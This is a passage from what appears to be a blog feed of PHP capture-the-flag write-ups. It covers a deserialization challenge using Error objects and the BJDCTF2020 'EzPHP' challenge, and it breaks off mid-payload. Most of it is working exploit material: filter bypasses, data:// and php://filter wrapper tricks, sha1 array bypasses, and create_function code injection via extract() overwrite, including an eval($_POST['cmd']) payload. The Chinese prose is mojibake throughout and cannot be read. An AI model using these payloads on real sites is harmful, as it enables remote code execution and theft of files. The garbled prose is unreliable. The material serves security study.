$b;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>($a != $b)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a!=b&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>(md5($a) === md5($b))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">if</span>(sha1($a)=== sha1($b))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sha1&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ç»“æœï¼š</p><p><img src="/2021/08/05/num/6.png" alt="6"></p><blockquote><p>$a å’Œ $b è¿™ä¸¤ä¸ªå¯¹è±¡æœ¬èº«ä¸åŒï¼Œä½†<code>__toString</code>æ–¹æ³•è¿”å›çš„ç»“æœæ˜¯ç›¸åŒçš„ï¼Œå‚æ•°åœ¨åŒä¸€è¡Œæ˜¯å› ä¸º <code>__toString</code> è¿”å›çš„æ•°æ®åŒ…å«å½“å‰è¡Œå·ã€‚</p><p>Exception ç±»ä¸ Error çš„ä½¿ç”¨å’Œç»“æœå®Œå…¨ä¸€æ ·ï¼Œ Exception ç±»é€‚ç”¨äºPHP 5å’Œ7ï¼Œè€ŒError åªé€‚ç”¨äº PHP 7ã€‚<br>å°†ä»£ç ä¸­çš„ $syc å’Œ $lover åˆ†åˆ«å£°æ˜ä¸ºç±»ä¼¼ä¸Šé¢çš„å†…ç½®ç±»çš„å¯¹è±¡ï¼Œè®©è¿™ä¸¤ä¸ªå¯¹è±¡æœ¬èº«ä¸åŒï¼Œ<code>__toString</code>æ–¹æ³•è¾“å‡ºçš„ç»“æœç›¸åŒå³å¯ã€‚</p><p>é¢˜ç›®ç”¨preg_matchè¿‡æ»¤äº†å°æ‹¬å·æ— æ³•è°ƒç”¨å‡½æ•°ï¼Œç”¨ include â€œ/flagâ€ å°†flagåŒ…å«è¿›æ¥å³å¯ï¼›è¿‡æ»¤äº†å¼•å·ï¼Œurlå–åç»•è¿‡å³å¯ã€‚</p></blockquote><p>expï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;    <span class="hljs-keyword">public</span> $syc;    <span class="hljs-keyword">public</span> $lover;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, $match))&#123;               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);           &#125; <span class="hljs-keyword">else</span> &#123;               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);           &#125;                   &#125;    &#125;&#125;$str = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">1</span>);$b=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">2</span>);$c = <span class="hljs-keyword">new</span> SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;<span class="hljs-keyword">echo</span>(urlencode(serialize($c)));<span class="hljs-meta">?&gt;</span></code></pre><img src="/2021/08/05/num/7.png" alt="7" style="zoom: 50%;"><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/fmyyy1/article/details/117162062">https://blog.csdn.net/fmyyy1/article/details/117162062</a></p>]]></content>
    
    
    <categories>
      
      <category>æ²™ç®±é€ƒé€¸</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHPåŸç”Ÿç±»</tag>
      
      <tag>expæº¢å‡º</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF2020||EzPHP</title>
    <link href="/2021/08/04/ez/"/>
    <url>/2021/08/04/ez/</url>
    
    <content type="html"><![CDATA[<p>æŸ¥çœ‹æºç ï¼Œæç¤ºGFXEIM3YFZYGQ4A=ï¼Œbase32è§£ç ï¼Œè·å–æºç </p><pre><code class="hljs coq">&lt;?phphighlight_file(__FILE__);error_reporting(<span class="hljs-number">0</span>); $file = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;$shana = $_GET[&#x27;shana&#x27;];$passwd = $_GET[&#x27;passwd&#x27;];$arg = &#x27;&#x27;;$code = &#x27;&#x27;;echo <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<span class="hljs-keyword">if</span>($_SERVER) &#123;     <span class="hljs-keyword">if</span> (        preg_match(&#x27;/shana|<span class="hljs-type">debu</span>|<span class="hljs-type">aqua</span>|<span class="hljs-type">cute</span>|<span class="hljs-type">arg</span>|<span class="hljs-type">code</span>|<span class="hljs-type">flag</span>|<span class="hljs-type">system</span>|<span class="hljs-type">exec</span>|<span class="hljs-type">passwd</span>|<span class="hljs-type">ass</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">shell</span>|<span class="hljs-type">ob</span>|<span class="hljs-type">start</span>|<span class="hljs-type">mail</span>|<span class="hljs-type">\$|sou</span>|<span class="hljs-type">show</span>|<span class="hljs-type">cont</span>|<span class="hljs-type">high</span>|<span class="hljs-type">reverse</span>|<span class="hljs-type">flip</span>|<span class="hljs-type">rand</span>|<span class="hljs-type">scan</span>|<span class="hljs-type">chr</span>|<span class="hljs-type">local</span>|<span class="hljs-type">sess</span>|<span class="hljs-type">id</span>|<span class="hljs-type">source</span>|<span class="hljs-type">arra</span>|<span class="hljs-type">head</span>|<span class="hljs-type">light</span>|<span class="hljs-type">read</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">info</span>|<span class="hljs-type">bin</span>|<span class="hljs-type">hex</span>|<span class="hljs-type">oct</span>|<span class="hljs-type">echo</span>|<span class="hljs-type">print</span>|<span class="hljs-type">pi</span>|<span class="hljs-type">\.|\&quot;|\&#x27;|log</span>/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])        )          die(&#x27;You seem to want to <span class="hljs-built_in">do</span> something bad?&#x27;); &#125;<span class="hljs-keyword">if</span> (!preg_match(&#x27;/http|<span class="hljs-type">https</span>/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;    <span class="hljs-keyword">if</span> (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123;         $file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];         echo <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;    &#125; &#125; <span class="hljs-keyword">else</span> die(&#x27;fxck you! What <span class="hljs-built_in">do</span> you want to <span class="hljs-built_in">do</span> ?!&#x27;);<span class="hljs-keyword">if</span>($_REQUEST) &#123;     foreach($_REQUEST <span class="hljs-built_in">as</span> $value) &#123;         <span class="hljs-keyword">if</span>(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))              die(&#x27;fxck you! I hate English!&#x27;);     &#125; &#125; <span class="hljs-keyword">if</span> (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)    die(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<span class="hljs-keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[<span class="hljs-string">&quot;flag&quot;</span>]);    echo <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;&#125; <span class="hljs-keyword">else</span>&#123;    die(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);&#125;<span class="hljs-keyword">if</span>(preg_match(&#x27;/^[a-z0<span class="hljs-number">-9</span>]*$/isD&#x27;, $code) |<span class="hljs-type">| </span><span class="hljs-type">preg_match</span>(&#x27;/fil|<span class="hljs-type">cat</span>|<span class="hljs-type">more</span>|<span class="hljs-type">tail</span>|<span class="hljs-type">tac</span>|<span class="hljs-type">less</span>|<span class="hljs-type">head</span>|<span class="hljs-type">nl</span>|<span class="hljs-type">tailf</span>|<span class="hljs-type">ass</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">shell</span>|<span class="hljs-type">ob</span>|<span class="hljs-type">start</span>|<span class="hljs-type">mail</span>|<span class="hljs-type">\`|\&#123;|\%|x</span>|<span class="hljs-type">\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou</span>|<span class="hljs-type">show</span>|<span class="hljs-type">cont</span>|<span class="hljs-type">high</span>|<span class="hljs-type">reverse</span>|<span class="hljs-type">flip</span>|<span class="hljs-type">rand</span>|<span class="hljs-type">scan</span>|<span class="hljs-type">chr</span>|<span class="hljs-type">local</span>|<span class="hljs-type">sess</span>|<span class="hljs-type">id</span>|<span class="hljs-type">source</span>|<span class="hljs-type">arra</span>|<span class="hljs-type">head</span>|<span class="hljs-type">light</span>|<span class="hljs-type">print</span>|<span class="hljs-type">echo</span>|<span class="hljs-type">read</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">flag</span>|<span class="hljs-type">1f</span>|<span class="hljs-type">info</span>|<span class="hljs-type">bin</span>|<span class="hljs-type">hex</span>|<span class="hljs-type">oct</span>|<span class="hljs-type">pi</span>|<span class="hljs-type">con</span>|<span class="hljs-type">rot</span>|<span class="hljs-type">input</span>|<span class="hljs-type">\.|log</span>|<span class="hljs-type">\^/i</span>&#x27;, $arg) ) &#123;     die(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); &#125; <span class="hljs-keyword">else</span> &#123;     include <span class="hljs-string">&quot;flag.php&quot;</span>;    $code(&#x27;&#x27;, $arg); &#125; ?&gt;</code></pre><p>æœ‰å¤šä¸ªç»•è¿‡ã€‚</p><h5 id="ç»•è¿‡-QUERY-STRING-çš„æ­£åˆ™åŒ¹é…"><a class="header-anchor" href="#ç»•è¿‡-QUERY-STRING-çš„æ­£åˆ™åŒ¹é…">ğŸ­</a>ç»•è¿‡ QUERY_STRING çš„æ­£åˆ™åŒ¹é…</h5><p><code>$_SERVER[&quot;QUERY_STRING&quot;] è·å–æŸ¥è¯¢è¯­å¥ï¼Œè·å–çš„æ˜¯?åé¢çš„å€¼</code></p><pre><code class="hljs gherkin">if($_SERVER) &#123;    if (    preg_match(&#x27;/shana|<span class="hljs-string">debu</span>|<span class="hljs-string">aqua</span>|<span class="hljs-string">cute</span>|<span class="hljs-string">arg</span>|<span class="hljs-string">code</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">system</span>|<span class="hljs-string">exec</span>|<span class="hljs-string">passwd</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">print</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><span class="hljs-string">    )</span><span class="hljs-string">        die(&#x27;You seem to want to do something bad?&#x27;);</span><span class="hljs-string">&#125;</span></code></pre><p><code>$_SERVER['QUERY_STRING']</code>ä¸è¿›è¡ŒURLDecodeï¼Œ<code>$_GET[]</code>ä¼šï¼Œæ‰€ä»¥åªè¦è¿›è¡Œurlç¼–ç å³å¯ç»•è¿‡</p><h5 id="ç»•è¿‡-xxx-ç±»å‹çš„æ­£åˆ™åŒ¹é…"><a class="header-anchor" href="#ç»•è¿‡-xxx-ç±»å‹çš„æ­£åˆ™åŒ¹é…">ğŸ­</a>ç»•è¿‡/^xxx$/ç±»å‹çš„æ­£åˆ™åŒ¹é…</h5><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123;        $file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;    &#125;&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</code></pre><p><code>^</code> åŒ¹é…èµ·å§‹ã€<code>$</code> åŒ¹é…ç»“æŸï¼Œ<code>preg_match</code>å€¼åŒ¹é…ç¬¬ä¸€è¡Œï¼Œåœ¨å¥å°¾åŠ ä¸Š<code>%0a</code>å³å¯ç»•è¿‡</p><h5 id="ç»•è¿‡-REQUEST-çš„å­—æ¯åŒ¹é…"><a class="header-anchor" href="#ç»•è¿‡-REQUEST-çš„å­—æ¯åŒ¹é…">ğŸ­</a>ç»•è¿‡ $_REQUEST çš„å­—æ¯åŒ¹é…</h5><pre><code class="hljs php"><span class="hljs-keyword">if</span>($_REQUEST) &#123;    <span class="hljs-keyword">foreach</span>($_REQUEST <span class="hljs-keyword">as</span> $value) &#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>);    &#125;&#125;</code></pre><p><code>foreach</code> å¾ªç¯éå† <code>$_REQUEST</code> æ•°ç»„ï¼Œå°†é”®å€¼èµ‹ç»™ <code>$value</code>ï¼Œç„¶åæ£€æµ‹ <code>$value</code> æ˜¯å¦åŒ…å«å­—æ¯ï¼Œè‹¥æ˜¯ åˆ™ <code>die()</code>ã€‚</p><p><code>$_REQUEST</code>åŒæ—¶æ¥å—GETå’ŒPOSTçš„æ•°æ®ï¼Œå¹¶ä¸”POSTå…·æœ‰æ›´é«˜çš„ä¼˜å…ˆå€¼(é»˜è®¤çš„ä¼˜å…ˆçº§ ENV&lt;GET&lt;POST&lt;COOKIE&lt;SERVER)ã€‚åŒæ—¶GETå’ŒPOSTåŒä¸€ä¸ªå‚æ•°å°±å¯ä»¥ç»•è¿‡.</p><h5 id="ç»•è¿‡æ–‡ä»¶å†…å®¹è¯»å–çš„æ¯”è¾ƒ"><a class="header-anchor" href="#ç»•è¿‡æ–‡ä»¶å†…å®¹è¯»å–çš„æ¯”è¾ƒ">ğŸ­</a>ç»•è¿‡æ–‡ä»¶å†…å®¹è¯»å–çš„æ¯”è¾ƒ</h5><pre><code class="hljs lisp">if (<span class="hljs-name">file_get_contents</span>($file) !== &#x27;y1ng_YuZhou_Wudi_zuishuai&#x27;)    die(&#x27; Am not I universe wudi zuishuai?&lt;br&gt;&#x27;)<span class="hljs-comment">;</span></code></pre><ul><li><p><code>php://input</code></p><p>å°†postè¿‡æ¥çš„æ•°æ®å…¨éƒ¨å½“åšæ–‡ä»¶å†…å®¹</p></li><li><p>data://</p></li><li><p><code>data://text/plain,&lt;?php phpinfo()?&gt;</code></p><ul><li><code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></li></ul></li></ul><h5 id="ç»•è¿‡sha1æ¯”è¾ƒ"><a class="header-anchor" href="#ç»•è¿‡sha1æ¯”è¾ƒ">ğŸ­</a>ç»•è¿‡sha1æ¯”è¾ƒ</h5><pre><code class="hljs smalltalk">if ( sha1(<span class="hljs-string">$s</span>hana) === sha1(<span class="hljs-string">$p</span>asswd) &amp;&amp; <span class="hljs-string">$s</span>hana != <span class="hljs-string">$p</span>asswd )&#123;    extract(<span class="hljs-string">$_</span>GET[<span class="hljs-comment">&quot;flag&quot;</span>]);    echo <span class="hljs-comment">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;&#125; else&#123;    die(<span class="hljs-comment">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);&#125;</code></pre><p>å¦‚æœ<code>sha1()</code>çš„å‚æ•°ä¸ºæ•°ç»„ï¼Œå°†ä¼šè¿”å›falseï¼Œæ‰€ä»¥<code>sha1(Array(xxx))==sha1(Array(yyy)))</code></p><p>payload:</p><pre><code class="hljs angelscript">/<span class="hljs-number">1</span>nD3x.php?file=%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">2f</span>%<span class="hljs-number">2f</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">2f</span>%<span class="hljs-number">70</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5f</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5f</span>%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>&amp;%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>=%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5f</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">5f</span>%<span class="hljs-number">63</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">0</span>A&amp;%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>[]=<span class="hljs-number">1</span>&amp;%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">77</span>%<span class="hljs-number">64</span>[]=<span class="hljs-number">2</span></code></pre><h5 id="create-function-ä»£ç æ³¨å…¥"><a class="header-anchor" href="#create-function-ä»£ç æ³¨å…¥">ğŸ­</a>create_function()ä»£ç æ³¨å…¥</h5><pre><code class="hljs gherkin">if(preg_match(&#x27;/^[a-z0-9]<span class="hljs-symbol">*</span>$/isD&#x27;, $code) ||    preg_match(&#x27;/fil|<span class="hljs-string">cat</span>|<span class="hljs-string">more</span>|<span class="hljs-string">tail</span>|<span class="hljs-string">tac</span>|<span class="hljs-string">less</span>|<span class="hljs-string">head</span>|<span class="hljs-string">nl</span>|<span class="hljs-string">tailf</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">x</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\</span>||<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">print</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">1f</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">con</span>|<span class="hljs-string">rot</span>|<span class="hljs-string">input</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">log</span>|<span class="hljs-string">\^/i&#x27;, $arg) ) &#123;</span><span class="hljs-string">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;);</span><span class="hljs-string">&#125; else &#123;</span><span class="hljs-string">    include &quot;flag.php&quot;;</span><span class="hljs-string">    $code(&#x27;&#x27;, $arg);</span><span class="hljs-string">&#125;</span></code></pre><p>create_function()</p><pre><code class="hljs nsis"><span class="hljs-variable">$myfunc</span> = create_function(<span class="hljs-string">&#x27;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>&#x27;</span>, <span class="hljs-string">&#x27;return <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;&#x27;</span>)<span class="hljs-comment">;</span></code></pre><p>==&gt;</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myfunc</span>(<span class="hljs-params">$a, $b</span>)</span>&#123;    <span class="hljs-keyword">return</span> $a+$b;&#125;</code></pre><p>å› ä¸ºç¬¬äºŒä¸ªå‚æ•°æ²¡æœ‰é™åˆ¶ï¼Œ<code>$code=return $a+$b;&#125;eval($_POST['cmd']);//</code>==&gt;</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myfunc</span>(<span class="hljs-params">$a, $b</span>)</span>&#123;<span class="hljs-keyword">return</span> $a+$b;&#125;<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-comment">//&#125;</span></code></pre><p>å¯æ‰§è¡Œä»»æ„ä»£ç ã€‚åœ¨ä¸Šä¸€é˜¶æ®µçš„extract($_GET[â€œflagâ€]);å¤„è¿›è¡Œå˜é‡è¦†ç›–ï¼Œä»è€Œä½¿å˜é‡$codeå’Œå˜é‡$argå¯æ§<br>é¦–å…ˆé—­åˆåŸæœ‰çš„è¯­å¥ï¼š<code>flag[arg]=&#125;</code>ï¼Œå‡½æ•°åŸºæœ¬è¢«ç¦ç”¨ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨ä½¿ç”¨get_defined_vars()å°†æ‰€æœ‰å˜é‡ä¸å€¼éƒ½è¿›è¡Œè¾“å‡ºï¼Œæ„é€ payloadï¼š</p><p><code>flag[arg]=&#125;var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></p><p>ç­‰ä»·äº</p><pre><code class="hljs delphi"><span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-comment">&#123;</span></span><span class="hljs-function"><span class="hljs-comment">&#125;</span></span><span class="hljs-function"><span class="hljs-title">var_dump</span><span class="hljs-params">(get_defined_vars()</span>);</span><span class="hljs-comment">//&#125;</span></code></pre><p>urlç¼–ç </p><pre><code class="hljs xquery">?<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75</span>=<span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61_is_</span><span class="hljs-meta">%63</span><span class="hljs-meta">%75</span><span class="hljs-meta">%74</span><span class="hljs-meta">%65</span><span class="hljs-meta">%0A</span>&amp;file=data://<span class="hljs-type">text</span>/plain,<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61</span>&amp;<span class="hljs-meta">%73</span><span class="hljs-meta">%68</span><span class="hljs-meta">%61</span><span class="hljs-meta">%6e</span><span class="hljs-meta">%61</span>[]=<span class="hljs-number">1</span>&amp;<span class="hljs-meta">%70</span><span class="hljs-meta">%61</span><span class="hljs-meta">%73</span><span class="hljs-meta">%73</span><span class="hljs-meta">%77</span><span class="hljs-meta">%64</span>[]=<span class="hljs-number">2</span>&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%61</span><span class="hljs-meta">%72</span><span class="hljs-meta">%67</span>]=&#125;var_dump(get_defined_vars());//&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span>]=create_function</code></pre><p><img src="/2021/08/04/ez/2.png" alt="2"></p><p>flagåœ¨<code>rea1fl4g.php</code>ä¸­ï¼Œ</p><p>è¿‡æ»¤äº† include è¿˜èƒ½ç”¨ requireï¼Œè¿‡æ»¤äº†å¼•å·ï¼Œå¯ä»¥ä½¿ç”¨é‚£äº›å‚æ•°å¯ä»¥ä¸åŠ å¼•å·çš„å‡½æ•°ï¼Œrequire() ä»£æ›¿ require<br>&quot; &quot;ï¼š<code>require(php://filter/read=convert.base64- encode/resource=rea1fl4g.php);// </code></p><p>è¿‡æ»¤äº† flagï¼Œé™åˆ¶äº†è®¸å¤šç¬¦å·ï¼Œä½¿ç”¨base64ç¼–ç æ–¹å¼ç»•è¿‡ï¼š</p><pre><code class="hljs xquery">flag[arg]=&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//&amp;flag[code]=create_function?<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75</span>=<span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61_is_</span><span class="hljs-meta">%63</span><span class="hljs-meta">%75</span><span class="hljs-meta">%74</span><span class="hljs-meta">%65</span><span class="hljs-meta">%0A</span>&amp;file=data://<span class="hljs-type">text</span>/plain,<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61</span>&amp;<span class="hljs-meta">%73</span><span class="hljs-meta">%68</span><span class="hljs-meta">%61</span><span class="hljs-meta">%6e</span><span class="hljs-meta">%61</span>[]=<span class="hljs-number">1</span>&amp;<span class="hljs-meta">%70</span><span class="hljs-meta">%61</span><span class="hljs-meta">%73</span><span class="hljs-meta">%73</span><span class="hljs-meta">%77</span><span class="hljs-meta">%64</span>[]=<span class="hljs-number">2</span>&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%61</span><span class="hljs-meta">%72</span><span class="hljs-meta">%67</span>]=&#125;;require(<span class="hljs-meta">%62</span><span class="hljs-meta">%61</span><span class="hljs-meta">%73</span><span class="hljs-meta">%65</span><span 